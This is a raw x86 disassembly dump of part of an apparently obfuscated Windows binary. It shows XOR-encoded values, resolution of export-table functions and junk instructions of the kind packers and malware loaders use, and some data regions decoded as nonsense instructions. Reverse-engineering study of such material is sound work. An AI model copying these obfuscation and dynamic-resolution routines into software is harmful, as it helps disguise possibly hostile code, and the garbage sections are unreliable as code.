  421d48:	add    DWORD PTR [ecx+0x7b],ecx
  421d4b:	jecxz  0x421d05
  421d4d:	imul   esp,DWORD PTR [ebp-0xf],0x7fe8c664
  421d54:	sar    cl,cl
  421d56:	sub    DWORD PTR [ecx-0x511dc348],0x8d3636e6
  421d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d61:	and    DWORD PTR [edi],ebp
  421d63:	fucomip st,st(6)
  421d65:	sbb    eax,0xfd311a11
  421d6a:	jno    0x421ddb
  421d6c:	push   edx
  421d6d:	inc    edx
  421d6e:	mov    si,0x591d
  421d72:	call   0xb7d22809
  421d77:	or     eax,0xab6937e6
  421d7c:	mov    esi,0x4168001b
  421d81:	push   edi
  421d82:	mov    eax,ds:0xfcfffc0f
  421d87:	imul   edi,DWORD PTR [esp+ebp*8+0x5ffa62d],0xffffffa8
  421d8f:	out    0xbe,eax
  421d91:	cwde   
  421d92:	jo     0x421dd6
  421d94:	mov    eax,DWORD PTR [ebp-0x1f8]
  421d9a:	mov    ecx,DWORD PTR [ebp-0x20c]
  421da0:	movzx  eax,WORD PTR [ecx+eax*4]
  421da4:	xor    eax,0xa59b
  421da9:	movzx  eax,ax
  421dac:	sar    eax,1
  421dae:	mov    ecx,DWORD PTR [ebp-0x1f8]
  421db4:	mov    edx,DWORD PTR [ebp-0x20c]
  421dba:	movzx  ecx,WORD PTR [edx+ecx*4]
  421dbe:	xor    ecx,0xa59b
  421dc4:	movzx  ecx,cx
  421dc7:	shl    ecx,0xf
  421dca:	or     eax,ecx
  421dcc:	mov    ecx,DWORD PTR [ebp-0x1fc]
  421dd2:	mov    BYTE PTR [ebp+ecx*1-0x198],al
  421dd9:	jmp    0x421879
  421dde:	mov    eax,DWORD PTR [ebp-0x1f0]
  421de4:	mov    edx,DWORD PTR [ebp-0x1ec]
  421dea:	xor    eax,0xcb79b576
  421def:	xor    edx,0x9c2b8ae8
  421df5:	mov    cl,0x2
  421df7:	call   0x408bb8
  421dfc:	mov    esi,eax
  421dfe:	mov    edi,edx
  421e00:	mov    eax,DWORD PTR [ebp-0x1f0]
  421e06:	mov    edx,DWORD PTR [ebp-0x1ec]
  421e0c:	xor    eax,0xcb79b576
  421e11:	xor    edx,0x9c2b8ae8
  421e17:	mov    cl,0x3e
  421e19:	call   0x4223ad
  421e1e:	or     esi,eax
  421e20:	or     edi,edx
  421e22:	mov    DWORD PTR [ebp-0x1e4],esi
  421e28:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e2e:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e34:	xor    eax,0xcb79b576
  421e39:	xor    edx,0x9c2b8ae8
  421e3f:	mov    cl,0x2
  421e41:	call   0x408bb8
  421e46:	mov    esi,eax
  421e48:	mov    edi,edx
  421e4a:	mov    eax,DWORD PTR [ebp-0x1e0]
  421e50:	mov    edx,DWORD PTR [ebp-0x1dc]
  421e56:	xor    eax,0xcb79b576
  421e5b:	xor    edx,0x9c2b8ae8
  421e61:	mov    cl,0x3e
  421e63:	call   0x4223ad
  421e68:	or     esi,eax
  421e6a:	or     edi,edx
  421e6c:	mov    DWORD PTR [ebp-0x23c],esi
  421e72:	mov    DWORD PTR [ebp-0x238],edi
  421e78:	mov    eax,DWORD PTR [ebp-0x23c]
  421e7e:	or     eax,DWORD PTR [ebp-0x238]
  421e84:	je     0x4220e4
  421e8a:	lea    eax,[ebp-0x204]
  421e90:	mov    DWORD PTR [ebp-0x208],eax
  421e96:	mov    eax,DWORD PTR [ebp-0x1e4]
  421e9c:	xor    edx,edx
  421e9e:	mov    cl,0x2
  421ea0:	call   0x4223ad
  421ea5:	mov    esi,eax
  421ea7:	mov    edi,edx
  421ea9:	mov    eax,DWORD PTR [ebp-0x1e4]
  421eaf:	xor    edx,edx
  421eb1:	mov    cl,0x3e
  421eb3:	call   0x408bb8
  421eb8:	or     esi,eax
  421eba:	or     edi,edx
  421ebc:	xor    esi,0xcb79b576
  421ec2:	xor    edi,0x9c2b8ae8
  421ec8:	mov    eax,DWORD PTR [ebp-0x208]
  421ece:	mov    DWORD PTR [eax],esi
  421ed0:	mov    DWORD PTR [eax+0x4],edi
  421ed3:	mov    eax,DWORD PTR [ebp-0x1e4]
  421ed9:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421ee1:	mov    eax,DWORD PTR [ebp-0x1e0]
  421ee7:	mov    edx,DWORD PTR [ebp-0x1dc]
  421eed:	xor    eax,0xcb79b576
  421ef2:	xor    edx,0x9c2b8ae8
  421ef8:	mov    cl,0x2
  421efa:	call   0x408bb8
  421eff:	mov    ebx,eax
  421f01:	mov    edi,edx
  421f03:	mov    eax,DWORD PTR [ebp-0x1e0]
  421f09:	mov    edx,DWORD PTR [ebp-0x1dc]
  421f0f:	xor    eax,0xcb79b576
  421f14:	xor    edx,0x9c2b8ae8
  421f1a:	mov    cl,0x3e
  421f1c:	call   0x4223ad
  421f21:	or     ebx,eax
  421f23:	or     edi,edx
  421f25:	movsx  eax,bl
  421f28:	cmp    esi,eax
  421f2a:	je     0x42208a
  421f30:	mov    eax,DWORD PTR [ebp-0x1e4]
  421f36:	movsx  esi,BYTE PTR [ebp+eax*1-0x198]
  421f3e:	mov    eax,DWORD PTR [ebp-0x204]
  421f44:	mov    edx,DWORD PTR [ebp-0x200]
  421f4a:	xor    eax,0xcb79b576
  421f4f:	xor    edx,0x9c2b8ae8
  421f55:	mov    cl,0x2
  421f57:	call   0x408bb8
  421f5c:	mov    edi,eax
  421f5e:	mov    ebx,edx
  421f60:	mov    eax,DWORD PTR [ebp-0x204]
  421f66:	mov    edx,DWORD PTR [ebp-0x200]
  421f6c:	xor    eax,0xcb79b576
  421f71:	xor    edx,0x9c2b8ae8
  421f77:	mov    cl,0x3e
  421f79:	call   0x4223ad
  421f7e:	or     edi,eax
  421f80:	or     ebx,edx
  421f82:	mov    eax,DWORD PTR [ebp-0x210]
  421f88:	movsx  eax,BYTE PTR [eax+edi*1]
  421f8c:	cmp    esi,eax
  421f8e:	je     0x421f9e
  421f94:	jmp    0x4220e4
  421f99:	jmp    0x42208a
  421f9e:	mov    eax,DWORD PTR [ebp-0x204]
  421fa4:	mov    edx,DWORD PTR [ebp-0x200]
  421faa:	xor    eax,0xcb79b576
  421faf:	xor    edx,0x9c2b8ae8
  421fb5:	mov    cl,0x2
  421fb7:	call   0x408bb8
  421fbc:	mov    esi,eax
  421fbe:	mov    edi,edx
  421fc0:	mov    eax,DWORD PTR [ebp-0x204]
  421fc6:	mov    edx,DWORD PTR [ebp-0x200]
  421fcc:	xor    eax,0xcb79b576
  421fd1:	xor    edx,0x9c2b8ae8
  421fd7:	mov    cl,0x3e
  421fd9:	call   0x4223ad
  421fde:	or     esi,eax
  421fe0:	or     edi,edx
  421fe2:	mov    eax,DWORD PTR [ebp-0x210]
  421fe8:	movsx  esi,BYTE PTR [eax+esi*1]
  421fec:	mov    eax,DWORD PTR [ebp-0x1f0]
  421ff2:	mov    edx,DWORD PTR [ebp-0x1ec]
  421ff8:	xor    eax,0xcb79b576
  421ffd:	xor    edx,0x9c2b8ae8
  422003:	mov    cl,0x2
  422005:	call   0x408bb8
  42200a:	mov    ebx,eax
  42200c:	mov    edi,edx
  42200e:	mov    eax,DWORD PTR [ebp-0x1f0]
  422014:	mov    edx,DWORD PTR [ebp-0x1ec]
  42201a:	xor    eax,0xcb79b576
  42201f:	xor    edx,0x9c2b8ae8
  422025:	mov    cl,0x3e
  422027:	call   0x4223ad
  42202c:	or     ebx,eax
  42202e:	or     edi,edx
  422030:	movsx  eax,bl
  422033:	cmp    esi,eax
  422035:	jne    0x42208a
  42203b:	mov    eax,DWORD PTR [ebp-0x1e0]
  422041:	mov    edx,DWORD PTR [ebp-0x1dc]
  422047:	xor    eax,0xcb79b576
  42204c:	xor    edx,0x9c2b8ae8
  422052:	mov    cl,0x2
  422054:	call   0x408bb8
  422059:	mov    esi,eax
  42205b:	mov    edi,edx
  42205d:	mov    eax,DWORD PTR [ebp-0x1e0]
  422063:	mov    edx,DWORD PTR [ebp-0x1dc]
  422069:	xor    eax,0xcb79b576
  42206e:	xor    edx,0x9c2b8ae8
  422074:	mov    cl,0x3e
  422076:	call   0x4223ad
  42207b:	or     esi,eax
  42207d:	or     edi,edx
  42207f:	mov    DWORD PTR [ebp-0x214],esi
  422085:	jmp    0x42212e
  42208a:	mov    eax,DWORD PTR [ebp-0x1e0]
  422090:	mov    edx,DWORD PTR [ebp-0x1dc]
  422096:	xor    eax,0xcb79b576
  42209b:	xor    edx,0x9c2b8ae8
  4220a1:	mov    cl,0x2
  4220a3:	call   0x408bb8
  4220a8:	mov    esi,eax
  4220aa:	mov    edi,edx
  4220ac:	mov    eax,DWORD PTR [ebp-0x1e0]
  4220b2:	mov    edx,DWORD PTR [ebp-0x1dc]
  4220b8:	xor    eax,0xcb79b576
  4220bd:	xor    edx,0x9c2b8ae8
  4220c3:	mov    cl,0x3e
  4220c5:	call   0x4223ad
  4220ca:	or     esi,eax
  4220cc:	or     edi,edx
  4220ce:	add    esi,DWORD PTR [ebp-0x1e4]
  4220d4:	mov    DWORD PTR [ebp-0x1e4],esi
  4220da:	jmp    0x421e28
  4220df:	jmp    0x421e28
  4220e4:	mov    eax,DWORD PTR [ebp-0x1f0]
  4220ea:	mov    edx,DWORD PTR [ebp-0x1ec]
  4220f0:	xor    eax,0xcb79b576
  4220f5:	xor    edx,0x9c2b8ae8
  4220fb:	mov    cl,0x2
  4220fd:	call   0x408bb8
  422102:	mov    esi,eax
  422104:	mov    edi,edx
  422106:	mov    eax,DWORD PTR [ebp-0x1f0]
  42210c:	mov    edx,DWORD PTR [ebp-0x1ec]
  422112:	xor    eax,0xcb79b576
  422117:	xor    edx,0x9c2b8ae8
  42211d:	mov    cl,0x3e
  42211f:	call   0x4223ad
  422124:	or     esi,eax
  422126:	or     edi,edx
  422128:	mov    DWORD PTR [ebp-0x214],esi
  42212e:	mov    eax,DWORD PTR [ebp-0x214]
  422134:	mov    DWORD PTR [ebp-0xc8],eax
  42213a:	cmp    DWORD PTR [ebp-0xc8],0x0
  422141:	je     0x42216b
  422147:	mov    eax,DWORD PTR [ebp-0x144]
  42214d:	mov    ecx,DWORD PTR [ebp-0xac]
  422153:	movzx  eax,WORD PTR [ecx+eax*2]
  422157:	mov    ecx,DWORD PTR [ebp-0xa8]
  42215d:	mov    eax,DWORD PTR [ecx+eax*4]
  422160:	mov    DWORD PTR [ebp-0xfc],eax
  422166:	jmp    0x422170
  42216b:	jmp    0x420789
  422170:	cmp    DWORD PTR [ebp-0xfc],0x0
  422177:	jne    0x422184
  42217d:	xor    eax,eax
  42217f:	jmp    0x4223a6
  422184:	mov    eax,DWORD PTR [ebp+0x8]
  422187:	add    eax,DWORD PTR [ebp-0xfc]
  42218d:	mov    DWORD PTR [ebp-0xec],eax
  422193:	mov    DWORD PTR [ebp-0x74],0x0
  42219a:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221a1:	je     0x42221d
  4221a7:	cmp    DWORD PTR [ebp-0xb0],0x0
  4221ae:	je     0x42221d
  4221b4:	mov    eax,DWORD PTR [ebp-0xb0]
  4221ba:	shl    eax,0x2
  4221bd:	mov    DWORD PTR [ebp-0x74],eax
  4221c0:	mov    DWORD PTR [ebp-0x14c],0x0
  4221ca:	sub    esp,DWORD PTR [ebp-0x74]
  4221cd:	mov    DWORD PTR [ebp-0x14c],esp
  4221d3:	mov    DWORD PTR [ebp-0x148],0x0
  4221dd:	mov    eax,DWORD PTR [ebp-0x148]
  4221e3:	cmp    eax,DWORD PTR [ebp-0xb0]
  4221e9:	je     0x42221d
  4221ef:	mov    eax,DWORD PTR [ebp-0x148]
  4221f5:	mov    ecx,DWORD PTR [ebp-0x14c]
  4221fb:	mov    edx,DWORD PTR [ebp-0x148]
  422201:	mov    esi,DWORD PTR [ebp+0x14]
  422204:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  422208:	mov    DWORD PTR [ecx+eax*4],edx
  42220b:	mov    eax,DWORD PTR [ebp-0x148]
  422211:	inc    eax
  422212:	mov    DWORD PTR [ebp-0x148],eax
  422218:	jmp    0x4221dd
  42221d:	mov    DWORD PTR [ebp-0x9c],0x0
  422227:	push   0x42235f
  42222c:	jmp    DWORD PTR [ebp-0xec]
  422232:	mov    eax,eax
  422234:	mov    ecx,esp
  422236:	ret    0x8
  422239:	cmp    DWORD PTR ds:0x4283b5,0x0
  422240:	not    DWORD PTR ds:0x4283b5
  422246:	mov    DWORD PTR ds:0x4283cd,0x5307
  422250:	mov    DWORD PTR ds:0x428525,0x4819
  42225a:	jmp    0x42229c
  42225f:	not    eax
  422261:	cmp    DWORD PTR ds:0x4283b5,0x0
  422268:	jl     0x42228a
  42226e:	push   0x0
  422270:	call   DWORD PTR ds:0x42e13c
  422276:	add    DWORD PTR ds:0x4284a5,0x4c21
  422280:	and    DWORD PTR ds:0x42848d,0x73e0
  42228a:	sub    DWORD PTR ds:0x4283f9,edx
  422290:	or     DWORD PTR ds:0x428301,ecx
  422296:	sub    DWORD PTR ds:0x42849d,ebx
  42229c:	push   ebx
  42229d:	dec    eax
  42229e:	push   esi
  42229f:	mov    eax,DWORD PTR [esp+0x18]
  4222a3:	or     eax,eax
  4222a5:	mov    DWORD PTR ds:0x4283bd,0x72ef
  4222af:	jne    0x4222eb
  4222b5:	mov    ecx,DWORD PTR [esp+0x14]
  4222b9:	mov    eax,DWORD PTR [esp+0x10]
  4222bd:	xor    edx,edx
  4222bf:	inc    ebx
  4222c0:	div    ecx
  4222c2:	sbb    ebx,DWORD PTR ds:0x428509
  4222c8:	mov    ebx,eax
  4222ca:	mov    eax,DWORD PTR [esp+0xc]
  4222ce:	adc    DWORD PTR ds:0x42848d,0x42841d
  4222d8:	div    ecx
  4222da:	mov    DWORD PTR ds:0x4283b5,0x3a7e
  4222e4:	mov    edx,ebx
  4222e6:	jmp    0x42235a
  4222eb:	mov    ecx,eax
  4222ed:	mov    ebx,DWORD PTR [esp+0x14]
  4222f1:	xor    eax,DWORD PTR ds:0x428529
  4222f7:	mov    edx,DWORD PTR [esp+0x10]
  4222fb:	mov    eax,DWORD PTR [esp+0xc]
  4222ff:	mov    DWORD PTR ds:0x428425,0x7dde
  422309:	shr    ecx,1
  42230b:	mov    DWORD PTR ds:0x428515,0x121c
  422315:	rcr    ebx,1
  422317:	shr    edx,1
  422319:	rcr    eax,1
  42231b:	or     ecx,ecx
  42231d:	jne    0x4222ff
  422323:	div    ebx
  422325:	mov    esi,eax
  422327:	mul    DWORD PTR [esp+0x18]
  42232b:	mov    ecx,eax
  42232d:	mov    eax,DWORD PTR [esp+0x14]
  422331:	mul    esi
  422333:	add    edx,ecx
  422335:	jb     0x422355
  42233b:	cmp    edx,DWORD PTR [esp+0x10]
  42233f:	ja     0x422355
  422345:	jb     0x422356
  42234b:	cmp    eax,DWORD PTR [esp+0xc]
  42234f:	jbe    0x422356
  422355:	dec    esi
  422356:	xor    edx,edx
  422358:	mov    eax,esi
  42235a:	pop    esi
  42235b:	pop    ebx
  42235c:	ret    0x10
  42235f:	sub    DWORD PTR [ebp+0x10],0x1
  422363:	mov    DWORD PTR ds:0x428491,0x3767
  42236d:	cmp    DWORD PTR [ebp+0x10],0x0
  422371:	mov    DWORD PTR ds:0x428519,0xcef
  42237b:	je     0x422390
  422381:	mov    esi,DWORD PTR ds:0x4284a9
  422387:	sbb    DWORD PTR ds:0x428515,esi
  42238d:	add    esp,DWORD PTR [ebp-0x74]
  422390:	mov    DWORD PTR [ebp-0x9c],eax
  422396:	mov    eax,DWORD PTR [ebp-0x9c]
  42239c:	mov    DWORD PTR ds:0x4283e1,0x5e8f
  4223a6:	pop    edi
  4223a7:	pop    esi
  4223a8:	pop    ebx
  4223a9:	leave  
  4223aa:	ret    0x10
  4223ad:	cmp    cl,0x40
  4223b0:	mov    DWORD PTR ds:0x4283e5,0x7c93
  4223ba:	jae    0x4223fa
  4223c0:	cmp    cl,0x20
  4223c3:	mov    DWORD PTR ds:0x428321,0x440e
  4223cd:	jae    0x4223d9
  4223d3:	shld   edx,eax,cl
  4223d6:	shl    eax,cl
  4223d8:	ret    
  4223d9:	movzx  edx,WORD PTR ds:0x428475
  4223e0:	add    DWORD PTR ds:0x428425,edx
  4223e6:	mov    edx,eax
  4223e8:	xor    eax,eax
  4223ea:	mov    DWORD PTR ds:0x428311,0x5f4f
  4223f4:	and    cl,0x1f
  4223f7:	shl    edx,cl
  4223f9:	ret    
  4223fa:	xor    eax,eax
  4223fc:	xor    edx,edx
  4223fe:	ret    
  4223ff:	add    BYTE PTR [ebx+esi*2],al
  422402:	xchg   ecx,ebp
  422404:	push   ebx
  422405:	into   
  422406:	jns    0x422469
  422408:	push   0x98626f72
  42240d:	xor    eax,0x74b9d761
  422412:	jne    0x422482
  422414:	and    dl,bl
  422416:	mov    ch,0xed
  422418:	popf   
  422419:	bnd ret 0xa4
  42241d:	add    BYTE PTR [eax],al
  42241f:	add    BYTE PTR [edi+0x72],ah
  422422:	gs popa 
  422424:	je     0x42248d
  422426:	jb     0x42248d
  422428:	popa   
  422429:	je     0x422492
  42242b:	jb     0x422492
  42242d:	popa   
  42242e:	je     0x422497
  422430:	jb     0x422497
  422432:	popa   
  422433:	je     0x42249c
  422435:	jb     0x42249c
  422437:	popa   
  422438:	je     0x4224a1
  42243a:	jb     0x4224a1
  42243c:	popa   
  42243d:	je     0x4224a6
  42243f:	jb     0x4224a6
  422441:	popa   
  422442:	je     0x4224ab
  422444:	jb     0x4224ab
  422446:	popa   
  422447:	je     0x4224b0
  422449:	jb     0x4224b0
  42244b:	popa   
  42244c:	je     0x4224b5
  42244e:	jb     0x4224b5
  422450:	popa   
  422451:	je     0x422453
  422453:	add    BYTE PTR [eax+0x65],ch
  422456:	ins    BYTE PTR es:[edi],dx
  422457:	ins    BYTE PTR es:[edi],dx
  422458:	push   0x686c6c65
  42245d:	gs ins BYTE PTR es:[edi],dx
  42245f:	ins    BYTE PTR es:[edi],dx
  422460:	push   0x686c6c65
  422465:	gs ins BYTE PTR es:[edi],dx
  422467:	ins    BYTE PTR es:[edi],dx
  422468:	push   0x686c6c65
  42246d:	gs ins BYTE PTR es:[edi],dx
  42246f:	ins    BYTE PTR es:[edi],dx
  422470:	push   0x686c6c65
  422475:	gs ins BYTE PTR es:[edi],dx
  422477:	ins    BYTE PTR es:[edi],dx
  422478:	push   0x686c6c65
  42247d:	gs ins BYTE PTR es:[edi],dx
  42247f:	ins    BYTE PTR es:[edi],dx
  422480:	push   0x686c6c65
  422485:	gs ins BYTE PTR es:[edi],dx
  422487:	ins    BYTE PTR es:[edi],dx
  422488:	add    BYTE PTR [eax],al
  42248a:	add    BYTE PTR [eax],al
  42248c:	outs   dx,DWORD PTR ds:[esi]
  42248d:	add    BYTE PTR [eax+eax*1+0x65],ch
  422491:	add    BYTE PTR [ecx+0x0],ah
  422494:	jne    0x422496
  422496:	je     0x422498
  422498:	xor    eax,DWORD PTR [eax]
  42249a:	xor    al,BYTE PTR [eax]
  42249c:	add    BYTE PTR [eax],al
  42249e:	add    BYTE PTR [eax],al
  4224a0:	push   0x61006500
  4224a5:	add    BYTE PTR [esi+0x0],dh
  4224a8:	add    BYTE PTR gs:[esi+0x0],ch
  4224ac:	push   0x61006500
  4224b1:	add    BYTE PTR [esi+0x0],dh
  4224b4:	add    BYTE PTR gs:[esi+0x0],ch
  4224b8:	push   0x61006500
  4224bd:	add    BYTE PTR [esi+0x0],dh
  4224c0:	add    BYTE PTR gs:[esi+0x0],ch
  4224c4:	push   0x61006500
  4224c9:	add    BYTE PTR [esi+0x0],dh
  4224cc:	add    BYTE PTR gs:[esi+0x0],ch
  4224d0:	push   0x61006500
  4224d5:	add    BYTE PTR [esi+0x0],dh
  4224d8:	add    BYTE PTR gs:[esi+0x0],ch
  4224dc:	push   0x61006500
  4224e1:	add    BYTE PTR [esi+0x0],dh
  4224e4:	add    BYTE PTR gs:[esi+0x0],ch
  4224e8:	push   0x61006500
  4224ed:	add    BYTE PTR [esi+0x0],dh
  4224f0:	add    BYTE PTR gs:[esi+0x0],ch
  4224f4:	push   0x61006500
  4224f9:	add    BYTE PTR [esi+0x0],dh
  4224fc:	add    BYTE PTR gs:[esi+0x0],ch
  422500:	push   0x61006500
  422505:	add    BYTE PTR [esi+0x0],dh
  422508:	add    BYTE PTR gs:[esi+0x0],ch
  42250c:	add    BYTE PTR [eax],al
  42250e:	add    BYTE PTR [eax],al
  422510:	mov    WORD PTR [edx+eax*2],fs
  422513:	add    BYTE PTR [edi+0x6c],cl
  422516:	gs dec ecx
  422518:	arpl   WORD PTR [edi+0x6e],bp
  42251b:	push   esp
  42251c:	outs   dx,DWORD PTR ds:[esi]
  42251d:	inc    ebx
  42251e:	jne    0x422592
  422520:	jae    0x422591
  422522:	jb     0x422524
  422524:	adc    al,0x25
  422526:	inc    edx
	...
  42252f:	add    al,dl
  422531:	sub    BYTE PTR [edx+0x0],al
  422534:	fsubr  DWORD PTR [eax]
  422536:	inc    edx
  422537:	add    BYTE PTR [eax-0xdffbdd9],dl
  42253d:	inc    edx
  42253e:	push   ebx
  42253f:	lea    edx,ds:0x1a59ba5
  422545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422546:	popf   
  422547:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422548:	jno    0x4224ef
  42254a:	xchg   edi,eax
  42254b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42254c:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  422552:	and    DWORD PTR [ebp-0x5a7a5ae7],0xffffff9b
  422559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42255a:	mov    ebx,0xd183d3a5
  42255f:	lea    edx,[ebp-0x645aea5b]
  422565:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422566:	add    DWORD PTR [ebp-0x5a8e5a63],esp
  42256c:	xchg   edi,eax
  42256d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42256e:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  422574:	and    DWORD PTR [ebp-0x5a7a5acb],0xffffff9b
  42257b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42257c:	mov    ebx,0xd1e3d3a5
  422581:	in     eax,dx
  422582:	xchg   ebp,eax
  422583:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422584:	adc    eax,0x3ba59ba5
  422589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42258a:	popf   
  42258b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42258c:	sbb    DWORD PTR [ebp-0x5a805a6b],esp
  422592:	(bad)  
  422593:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422594:	fwait
  422595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422596:	xchg   DWORD PTR [ebp-0x322e3c2d],esp
  42259c:	icebp  
  42259d:	sub    eax,0xf172ff7
  4225a2:	adc    eax,0x3a59109
  4225a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225a8:	fwait
  4225a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225aa:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  4225b0:	xchg   ebp,eax
  4225b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b2:	sbb    DWORD PTR [ebp-0x5a645a73],esp
  4225b8:	and    DWORD PTR [ebp+0x2dd123d3],0xfffffff1
  4225bf:	or     eax,0x6f170ff7
  4225c4:	adc    eax,0x3a59169
  4225c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ca:	fwait
  4225cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225cc:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  4225d2:	xchg   ebp,eax
  4225d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d4:	xor    eax,0x9ba58da5
  4225d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225da:	and    DWORD PTR [ebp+0xdd103d3],0xfffffff1
  4225e1:	ins    DWORD PTR es:[edi],dx
  4225e2:	imul   DWORD PTR [edi+0x17]
  4225e5:	dec    edi
  4225e6:	adc    eax,0x37a59149
  4225eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ec:	fwait
  4225ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ee:	jae    0x422595
  4225f0:	popf   
  4225f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f2:	sbb    DWORD PTR [ebp-0x5aba5a6b],esp
  4225f8:	(bad)  
  4225f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fa:	fwait
  4225fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fc:	and    DWORD PTR [ebp+0x6dd163d3],0xfffffff1
  422603:	dec    ebp
  422604:	test   DWORD PTR [edi+0x16],0x91a914af
  42260b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260c:	aaa    
  42260d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42260e:	fwait
  42260f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422610:	jae    0x4225b7
  422612:	popf   
  422613:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422614:	pop    ss
  422615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422616:	xchg   ebp,eax
  422617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422618:	push   ecx
  422619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261a:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422620:	rol    DWORD PTR [ebx-0x2f],cl
  422623:	dec    ebp
  422624:	lock lods eax,DWORD PTR ds:[esi]
  422626:	imul   BYTE PTR [edi-0x76eb70ea]
  42262c:	xchg   ecx,eax
  42262d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262e:	aaa    
  42262f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422630:	fwait
  422631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422632:	jae    0x4225d9
  422634:	popf   
  422635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422636:	cmp    esp,DWORD PTR [ebp-0x5a8c5a6b]
  42263c:	(bad)  
  42263d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263e:	fwait
  42263f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422640:	xchg   DWORD PTR [ebp-0x522f5c2e],esp
  422646:	lock (bad) 
  422648:	test   BYTE PTR [edi-0x16eb10ea],0x91
  42264f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422650:	aaa    
  422651:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422652:	fwait
  422653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422654:	jae    0x4225fb
  422656:	popf   
  422657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422658:	cmp    DWORD PTR [ebp-0x5a805a6b],esp
  42265e:	(bad)  
  42265f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422660:	fwait
  422661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422662:	and    DWORD PTR [ebp-0x722f7c2e],0xfffffff0
  422669:	in     eax,dx
  42266a:	imul   bh
  42266c:	push   ss
  42266d:	iret   
  42266e:	adc    al,0xc9
  422670:	xchg   ecx,eax
  422671:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422672:	cmp    eax,0x51a59ba5
  422677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422678:	popf   
  422679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267a:	jnp    0x422621
  42267c:	xchg   ebx,eax
  42267d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267e:	fwait
  42267f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422680:	xchg   ecx,eax
  422681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422682:	shl    bl,cl
  422684:	shr    ch,1
  422686:	lock int 0xf6
  422689:	iret   
  42268a:	push   ss
  42268b:	das    
  42268c:	adc    al,0x29
  42268e:	push   ss
  42268f:	unpcklps xmm1,XMMWORD PTR [ecx]
  422692:	xchg   ebx,eax
  422693:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422694:	adc    DWORD PTR [ebp-0x5ab65a65],esp
  42269a:	lahf   
  42269b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42269c:	cmp    esp,DWORD PTR [ebp-0x5a825a6d]
  4226a2:	mov    DWORD PTR [ebp-0x5a725a65],esp
  4226a8:	shl    BYTE PTR [ebx],cl
  4226aa:	shr    BYTE PTR ds:0xff60df0,1
  4226b0:	push   ss
  4226b1:	outs   dx,DWORD PTR ds:[esi]
  4226b2:	adc    al,0x69
  4226b4:	xchg   ecx,eax
  4226b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b6:	add    BYTE PTR [eax],al
  4226b8:	inc    eax
  4226b9:	and    eax,0x274c0042
  4226be:	inc    edx
  4226bf:	add    BYTE PTR [edi+eiz*1+0x42],dl
  4226c3:	add    ah,bl
  4226c5:	sub    BYTE PTR [edx+0x0],al
  4226c8:	cmp    BYTE PTR ds:0x27580042,ah
  4226ce:	inc    edx
  4226cf:	add    BYTE PTR [esi+0x7e],bh
  4226d2:	inc    edx
  4226d3:	add    dh,dh
